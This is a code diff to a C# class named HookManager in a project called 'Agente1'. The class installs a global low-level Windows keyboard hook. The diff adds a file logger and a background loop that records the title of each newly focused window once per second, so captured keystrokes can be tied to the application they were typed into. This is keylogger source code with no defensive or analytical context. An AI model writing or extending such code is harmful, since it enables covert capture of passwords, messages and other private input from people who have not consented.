@@ -1,10 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Agente1
 {
@@ -24,6 +23,12 @@ namespace Agente1
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
 
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_KEYUP = 0x0101;
@@ -31,10 +36,13 @@ namespace Agente1
         private readonly LowLevelKeyboardProc _proc;
         private IntPtr _hookID = IntPtr.Zero;
         private readonly KeyHandler keyHandler;
+        private readonly FileLogger fileLogger;
+        private IntPtr lastForegroundWindow = IntPtr.Zero;
 
-        public HookManager(KeyHandler keyHandler)
+        public HookManager(KeyHandler keyHandler, FileLogger fileLogger)
         {
             this.keyHandler = keyHandler;
+            this.fileLogger = fileLogger;
             _proc = HookCallback;
         }
 
@@ -50,6 +58,41 @@ namespace Agente1
         public void Unhook()
         {
             UnhookWindowsHookEx(_hookID);
+        }
+
+        public void Start()
+        {
+            SetHook();
+            Task.Run(() => MonitorActiveWindow());
+        }
+
+        private async Task MonitorActiveWindow()
+        {
+            while (true)
+            {
+                IntPtr foregroundWindow = GetForegroundWindow();
+                if (foregroundWindow != lastForegroundWindow)
+                {
+                    lastForegroundWindow = foregroundWindow;
+                    string windowTitle = GetActiveWindowTitle(foregroundWindow);
+                    if (!string.IsNullOrEmpty(windowTitle))
+                    {
+                        fileLogger.LogWindowTitle(windowTitle);
+                    }
+                }
+                await Task.Delay(1000);
+            }
+        }
+
+        private string GetActiveWindowTitle(IntPtr hWnd)
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            if (GetWindowText(hWnd, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
         }
 
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
